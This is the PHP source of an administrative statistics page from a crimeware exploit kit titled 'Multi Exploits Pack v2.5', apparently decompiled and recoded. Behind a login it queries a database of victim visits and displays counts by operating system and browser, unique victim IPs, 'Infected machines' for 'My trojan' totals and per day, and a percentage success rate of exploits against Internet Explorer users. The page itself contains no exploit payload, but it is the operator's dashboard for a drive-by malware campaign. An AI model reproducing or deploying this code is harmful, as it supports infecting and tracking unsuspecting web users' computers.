<?php
/************************/
/*                      */
/*Dezended By Martian   */
/*munir.skilledsoft.com */
/*                      */
/*                      */
/************************/
error_reporting(0);
session_start( );
include( "../inc.config.php" );
include( "../lib/lib.placeholder.php" );
include( "../lib/lib.functions.php" );
if ( !mysql_connect( $db_host, $db_user, $db_pass ) )
{
    exit( "Couldn't connect to db!" );
}
if ( !mysql_select_db( $db_name ) )
{
    exit( "DB \"".$db_name."\" not found!" );
}
if ( @$_SESSION['IsLoggedIn'] != true && !eregi( "login\\.php\$", getenv( "SCRIPT_NAME" ) ) )
{
    redirect( "login.php" );
}
echo "<html>\r\n<head>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\">\r\n<title>Multi Exploits Pack v2.5</title>\r\n<style>\r\n";
include( "images/style.css" );
echo "</style>\r\n</head>\r\n<body bgcolor=\"#7AA0B8\" leftmargin=\"0\" topmargin=\"0\" marginwidth=\"0\" marginheight=\"0\">\r\n<table cellpadding=0 cellspacing=0 width='700' border=1 align=center bordercolor=\"#ECF0F3\" bordercolorlight=black bordercolordark=white>\r\n<tr><td align=\"center\" class=\"pagetitle\" bgcolor=\"#596771\"><b> Traffic tracking script Multi Exploits Pack v2.5</b></td>\r\n</tr><tr><td align=\"center\" class=\"pagetitle\" bgcolor=\"#000000\"><b>Administrative statistics on downloads with traffic</b></td>\r\n</tr><tr><td align=\"left\" class=\"hover\" bgcolor=\"#ffffff\">\r\n<table width=\"100%\" cellpadding=\"0\" cellspacing=\"0\">\r\n<tr><td align=\"left\">&nbsp;&nbsp;<font color=\"black\">Status:</font> <font color=black><b>&nbsp;&nbsp;[";
echo $_SESSION['Login'];
echo "]</b></font></td>\r\n<td align=\"right\">\r\n\r\n\t\t\t\t\t\t| <a href=\"index.php\"><b>Statistics</b></a>\r\n\t\t\t\t\t\t| <a href=\"lang.php\"><b>languages</b></a>\r\n\t\t\t\t\t\t| <a href=\"help.php\"><b>Help</b></a>\r\n\t\t\t\t\t\t| <a href=\"change_pass.php\"><b>change Password</b></a>\r\n\t\t\t\t\t\t| <a href=\"user_manager.php\"><b>Add User</b></a>\r\n\t\t\t\t\t\t| <a href=\"clear_db.php\"><b>Clear DB</b></a>\r\n\t\t\t\t\t\t| <a href=\"logout.php\"><b>Logout</b></a></font>\r\n\t\t\t\t\t\t/&nbsp;&nbsp;\r\n</td></tr></table></td></tr><tr><td valign=\"top\">\r\n<table cellpadding=\"0\" cellspacing=\"0\" width=\"700\" border=\"1\" align=\"left\" bordercolor=\"#7AA0B8\" bordercolorlight=\"black\" bordercolordark=\"white\">\r\n\r\n\t<tr>\r\n\r\n\t\t<td valign=\"top\">\r\n\r\n";
$sql = "select os, count(*) as total from tp_stats group by os";
$r = mysql_query( $sql );
echo "\r\n\t\t\t<table cellpadding=\"0\" cellspacing=\"0\" width=\"200\" border=\"1\" align=\"center\" bordercolor=\"#7AA0B8\" bordercolorlight=\"black\" bordercolordark=\"white\">\r\n\r\n\t\t\t\t<tr>\r\n\r\n\t\t\t\t\t<td align=\"center\" class=\"pagetitle\" bgcolor=\"#103056\" colspan=\"2\"><b>Operating Systems</b></td>\r\n\r\n\t\t\t\t</tr>\r\n\r\n\t\t\t\t";
while ( $Row = mysql_fetch_array( $r ) )
{
    echo "\r\n\t\t\t\t<tr>\r\n\r\n\t\t\t\t\t<td align=\"left\" class=\"pagetitle\">&nbsp;&nbsp;<b>";
    echo $Row['os'];
    echo "</b></td>\r\n\r\n\t\t\t\t\t<td align=\"center\" class=\"pagetitle2\" bgcolor=\"#7AA0B8\">\r\n\t\t\t\t\t<input type=\"text\" size=\"5\" class=\"inputbox2\" disabled=\"disabled\" value=\"";
    echo $Row['total'];
    echo "\"?></td>\r\n\r\n\t\t\t\t</tr>\r\n\r\n\t\t\t\t";
}
echo "\r\n\t\t\t</table>\r\n\r\n\t\t</td>\r\n\r\n\t\t<td valign=\"top\">\r\n\r\n\t\t\t<table cellpadding=\"0\" cellspacing=\"0\" width=\"500\" border=\"1\" align=\"left\" bordercolor=\"#7AA0B8\" bordercolorlight=\"black\" bordercolordark=\"white\">\r\n\r\n\t\t\t\t<tr>\r\n\r\n\t\t\t\t\t<td align=\"center\" class=\"pagetitle\" bgcolor=\"#8897A2\" colspan=\"10\"><b>The total stat on traffic</b></td>\r\n\r\n\t\t\t\t</tr>\r\n\r\n\t\t\t\t<tr>\r\n\r\n\t\t\t\t\t<td valign=\"top\">\r\n\r\n\t\t\t\t\t\t<table cellpadding=\"0\" cellspacing=\"0\" width=\"500\" border=\"0\" align=\"left\" bordercolor=\"#7AA0B8\" bordercolorlight=\"black\" bordercolordark=\"white\">\r\n\r\n\t\t\t\t\t\t\t<tr>\r\n\r\n\t\t\t\t\t\t\t\t<td valign=\"top\">\r\n\r\n";
$sql = "select browser, count(*) as total from tp_stats group by browser";
$r = mysql_query( $sql );
echo "\r\n\t\t\t\t\t\t\t\t\t<table cellpadding=\"0\" cellspacing=\"0\" width=\"250\" border=\"0\" align=\"center\" bordercolor=\"#7AA0B8\" bordercolorlight=\"black\" bordercolordark=\"white\">\r\n\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\r\n\t\t\t\t\t\t\t\t\t\t\t<td align=\"center\" class=\"pagetitle\" bgcolor=\"#103056\" colspan=\"2\"><b>versions of browsers</b></td>\r\n\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\r\n\t\t\t\t\t\t\t\t\t\t";
while ( $Row = mysql_fetch_array( $r ) )
{
    echo "\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\r\n\t\t\t\t\t\t\t\t\t\t\t<td align=\"left\" class=\"pagetitle\">&nbsp;&nbsp;<b>";
    echo $Row['browser'];
    echo "</b></td>\r\n\r\n\t\t\t\t\t\t\t\t\t\t\t<td align=\"center\" class=\"pagetitle2\" bgcolor=\"#7AA0B8\">\r\n\t\t\t\t\t\t\t\t\t\t\t<input type=\"text\" size=\"5\" class=\"inputbox2\" disabled=\"disabled\" value=\"";
    echo $Row['total'];
    echo "\"?></td>\r\n\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\r\n\t\t\t\t\t\t\t\t\t\t";
}
echo "\r\n\t\t\t\t\t\t\t\t\t</table>\r\n\r\n\t\t\t\t\t\t\t\t</td>\r\n\r\n\t\t\t\t\t\t\t\t<td valign=\"top\">\r\n\r\n";
$sql = "select count(*) as total, count(distinct ip) as uniq from tp_stats";
$r = mysql_query( $sql );
$Row = mysql_fetch_array( $r );
echo "\r\n\t\t\t\t\t\t\t\t\t<table cellpadding=\"0\" cellspacing=\"0\" width=\"250\" border=\"0\" align=\"center\" bordercolor=\"#7AA0B8\" bordercolorlight=\"black\" bordercolordark=\"white\">\r\n\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\r\n\t\t\t\t\t\t\t\t\t\t\t<td align=\"center\" class=\"pagetitle\" bgcolor=\"#103056\" colspan=\"2\"><b>Total traffic</b></td>\r\n\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\r\n\t\t\t\t\t\t\t\t\t\t\t<td align=\"left\" class=\"pagetitle\">&nbsp;&nbsp;<b>All hosts</b></td>\r\n\r\n\t\t\t\t\t\t\t\t\t\t\t<td align=\"center\" class=\"pagetitle2\" bgcolor=\"#7AA0B8\">\r\n\t\t\t\t\t\t\t\t\t\t\t<input type=\"text\" size=\"5\" class=\"inputbox2\" disabled=\"disabled\" value=\"";
echo $Row['total'];
echo "\"?></td>\r\n\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\r\n\t\t\t\t\t\t\t\t\t\t\t<td align=\"left\" class=\"pagetitle\">&nbsp;&nbsp;<b>unique visitors</b></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td align=\"center\" class=\"pagetitle2\" bgcolor=\"#7AA0B8\">\r\n\t\t\t\t\t\t\t\t\t\t\t<input type=\"text\" size=\"5\" class=\"inputbox2\" disabled=\"disabled\" value=\"";
echo $Row['uniq'];
echo "\"?></td>\r\n\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\r\n\t\t\t\t\t\t\t\t\t</table>\r\n\r\n\t\t\t\t\t\t\t\t</td>\r\n\r\n\t\t\t\t\t\t\t</tr>\r\n\r\n";
$sql = "select total from tp_hits";
$r = mysql_query( $sql );
$Row = mysql_fetch_array( $r );
echo "\r\n\t\t\t\t\t\t\t<tr>\r\n\r\n\t\t\t\t\t\t\t\t<td align=\"center\" class=\"pagetitle\" bgcolor=\"#103056\" colspan=\"10\"><b>Attempts to view  (banned)</b>&nbsp;&nbsp;<input type=\"text\" size=\"5\" class=\"inputbox2\" disabled=\"disabled\" value=\"";
echo $Row['total'];
echo "\"?></td>\r\n\r\n\t\t\t\t\t\t\t</tr>\r\n\r\n\t\t\t\t\t\t</table>\r\n\r\n\t\t\t\t\t</td>\r\n\r\n\t\t\t\t</tr>\r\n\r\n\t\t\t\t<tr>\r\n\r\n\t\t\t\t\t<td align=\"center\" class=\"pagetitle\" bgcolor=\"#8897A2\" colspan=\"10\"><b>Statistics for downloading your software</b></td>\r\n\r\n\t\t\t\t</tr>\r\n\r\n\t\t\t\t<tr>\r\n\r\n\t\t\t\t\t<td valign=\"top\">\r\n\r\n\t\t\t\t\t\t<table cellpadding=\"0\" cellspacing=\"0\" width=\"500\" border=\"0\" align=\"left\" bordercolor=\"#7AA0B8\" bordercolorlight=\"black\" bordercolordark=\"white\">\r\n\r\n\t\t\t\t\t\t\t<tr>\r\n\r\n\t\t\t\t\t\t\t\t<td valign=\"top\">\r\n\r\n";
$sql = "select count(*) as total_downloaded from tp_stats where is_downloaded = 1";
$r = mysql_query( $sql );
$Row = mysql_fetch_array( $r );
echo "\r\n\t\t\t\t\t\t\t\t\t<table cellpadding=\"0\" cellspacing=\"0\" width=\"250\" border=\"0\" align=\"center\" bordercolor=\"#7AA0B8\" bordercolorlight=\"black\" bordercolordark=\"white\">\r\n\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\r\n\t\t\t\t\t\t\t\t\t\t\t<td align=\"center\" class=\"pagetitle\" bgcolor=\"#103056\" colspan=\"2\"><b>Infected machines (total)</b></td>\r\n\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\r\n\t\t\t\t\t\t\t\t\t\t\t<td align=\"left\" class=\"pagetitle\">&nbsp;&nbsp;<b><a href=\"ip_stat.php\">My trojan</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</b></td>\r\n\r\n\t\t\t\t\t\t\t\t\t\t\t<td align=\"center\" class=\"pagetitle2\" bgcolor=\"#7AA0B8\">\r\n\t\t\t\t\t\t\t\t\t\t\t<input type=\"text\" size=\"5\" class=\"inputbox2\" disabled=\"disabled\" value=\"";
echo $Row['total_downloaded'];
echo "\"?></td>\r\n\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\r\n\t\t\t\t\t\t\t\t\t</table>\r\n\r\n\t\t\t\t\t\t\t\t</td>\r\n\r\n\t\t\t\t\t\t\t\t<td valign=\"top\">\r\n\r\n";
$sql = "select count(*) as today_downloaded from tp_stats where is_downloaded = 1 AND datetime > '".date( "Y-m-d H:i:s", time( ) - 86400 )."'";
$r = mysql_query( $sql );
$Row = mysql_fetch_array( $r );
echo "\r\n\t\t\t\t\t\t\t\t\t<table cellpadding=\"0\" cellspacing=\"0\" width=\"250\" border=\"0\" align=\"center\" bordercolor=\"#7AA0B8\" bordercolorlight=\"black\" bordercolordark=\"white\">\r\n\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\r\n\t\t\t\t\t\t\t\t\t\t\t<td align=\"center\" class=\"pagetitle\" bgcolor=\"#103056\" colspan=\"2\"><b>Infected machines (per night)</b></td>\r\n\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\r\n\t\t\t\t\t\t\t\t\t\t\t<td align=\"left\" class=\"pagetitle\">&nbsp;&nbsp;<b><a href=\"ip_stat.php?filter=24h\">My trojan</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</b></td>\r\n\r\n\t\t\t\t\t\t\t\t\t\t\t<td align=\"center\" class=\"pagetitle2\" bgcolor=\"#7AA0B8\">\r\n\t\t\t\t\t\t\t\t\t\t\t<input type=\"text\" size=\"5\" class=\"inputbox2\" disabled=\"disabled\" value=\"";
echo $Row['today_downloaded'];
echo "\"?></td>\r\n\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\r\n\t\t\t\t\t\t\t\t\t</table>\r\n\r\n\t\t\t\t\t\t\t\t</td>\r\n\r\n\t\t\t\t\t\t\t</tr>\r\n\r\n\t\t\t\t\t\t</table>\r\n\r\n\t\t\t\t\t</td>\r\n\r\n\t\t\t\t</tr>\r\n\r\n\t\t\t\t<tr>\r\n\r\n\t\t\t\t\t<td align=\"center\" class=\"pagetitle\" bgcolor=\"#8897A2\" colspan=\"10\"><b>Calculation of penetration exploits</b></td>\r\n\r\n\t\t\t\t</tr>\r\n\r\n\t\t\t\t<tr>\r\n\r\n\t\t\t\t\t<td valign=\"top\">\r\n\r\n\t\t\t\t\t\t<table cellpadding=\"0\" cellspacing=\"0\" width=\"500\" border=\"0\" align=\"left\" bordercolor=\"#7AA0B8\" bordercolorlight=\"black\" bordercolordark=\"white\">\r\n\r\n\t\t\t\t\t\t\t<tr>\r\n\r\n\t\t\t\t\t\t\t\t<td valign=\"top\" colspan=\"2\">\r\n\r\n";
$sql = "select count(*) as downloaded from tp_stats where browser = 'MSIE' AND is_downloaded = 1";
$r = mysql_query( $sql );
$Row = mysql_fetch_array( $r );
$downloaded = $Row['downloaded'];
$sql = "select count(*) as total from tp_stats where browser = 'MSIE'";
$r = mysql_query( $sql );
$Row = mysql_fetch_array( $r );
if ( 0 < $Row['total'] )
{
    $hacked_percent = round( $downloaded * 100 / $Row['total'] );
}
else
{
    $hacked_percent = 0;
}
echo "\r\n\t\t\t\t\t\t\t\t\t<table cellpadding=\"0\" cellspacing=\"0\" width=\"500\" border=\"0\" align=\"center\" bordercolor=\"#7AA0B8\" bordercolorlight=\"black\" bordercolordark=\"white\">\r\n\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\r\n\t\t\t\t\t\t\t\t\t\t\t<td align=\"left\" class=\"pagetitle\">&nbsp;&nbsp;<b>Penetration exploits all Windows systems (%):</b></td>\r\n\r\n\t\t\t\t\t\t\t\t\t\t\t<td align=\"center\" class=\"pagetitle2\" bgcolor=\"#7AA0B8\"><input type=\"text\" size=\"5\" class=\"inputbox2\" disabled=\"disabled\" value=\"";
echo $hacked_percent;
echo "\"></td>\r\n\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\r\n\t\t\t\t\t\t\t\t\t</table>\r\n\r\n\t\t\t\t\t\t\t\t</td>\r\n\r\n\t\t\t\t\t\t\t</tr>\r\n\r\n\t\t\t\t\t\t</table>\r\n\r\n\t\t\t\t\t</td>\r\n\r\n\t\t\t\t</tr>\r\n\r\n\t\t\t\t<tr>\r\n\r\n\t\t\t\t\t<td align=\"center\" class=\"pagetitle\" bgcolor=\"#8897A2\" colspan=\"10\"><b>Calculation of traffic operating systems</b></td>\r\n\r\n\t\t\t\t</tr>\r\n\r\n\t\t\t\t<tr>\r\n\r\n\t\t\t\t\t<td valign=\"top\">\r\n\r\n\t\t\t\t\t\t<table cellpadding=\"0\" cellspacing=\"0\" width=\"500\" border=\"0\" align=\"left\" bordercolor=\"#7AA0B8\" bordercolorlight=\"black\" bordercolordark=\"white\">\r\n\r\n\t\t\t\t\t\t\t<tr>\r\n\r\n\t\t\t\t\t\t\t\t<td valign=\"top\" colspan=\"2\">\r\n\r\n\t\t\t\t\t\t\t\t\t<table cellpadding=\"0\" cellspacing=\"0\" width=\"500\" border=\"1\" align=\"center\" bordercolor=\"#7AA0B8\" bordercolorlight=\"black\" bordercolordark=\"white\">\r\n\r\n\t\t\t\t\t\t\t\t\t\t<tr>\r\n\r\n\t\t\t\t\t\t\t\t\t\t\t<td align=\"left\" class=\"pagetitle\" colspan=\"3\">&nbsp;&nbsp;<b>upload exploits:</b>&nbsp;&nbsp;";
echo $downloaded;
echo " раз</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n";
$sql = "select os, count(*) as total from tp_stats where browser = 'MSIE' AND is_downloaded = 1 group by os";
$r = mysql_query( $sql );
echo "\t\t\t\t\t\t\t\t\t\t";
while ( $Row = mysql_fetch_array( $r ) )
{
    $os_percent = ( integer )( $Row['total'] * 100 / $downloaded );
    echo "\t\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t\t<td align=\"left\" class=\"pagetitle\" width=\"150\">&nbsp;&nbsp;<b>";
    echo $Row['os'];
    echo ":</b></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td align=\"center\" class=\"pagetitle\" width=\"250\"><img height=9 width=\"";
    echo $os_percent;
    echo "%\" src=\"images/vote_middle.gif\"></td>\r\n\t\t\t\t\t\t\t\t\t\t\t<td align=\"center\" class=\"pagetitle2\" bgcolor=\"#7AA0B8\" width=\"100\"><input type=\"text\" size=\"5\" class=\"inputbox2\" disabled=\"disabled\" value=\"";
    echo $os_percent;
    echo "\">%</td>\r\n\t\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t\t";
}
echo "\t\t\t\t\t\t\t\t\t</table>\r\n\t\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t</table>\r\n\t\t\t\t\t</td>\r\n\t\t\t\t</tr>\r\n\t\t\t</table>\r\n\t\t</td>\r\n\t</tr>\r\n</table>\r\n</td></tr><tr><td align=\"center\" class=\"pagetitle\" bgcolor=\"#000000\"><a href=\"http://munir.skilledsoft.com\"><font color=\"snow\">Recoded By by&nbsp;<b>Alienwithin</b>&nbsp; || Original Coder's(ICQ 92777755)</a></font></td></tr></table></body></html>";
?>
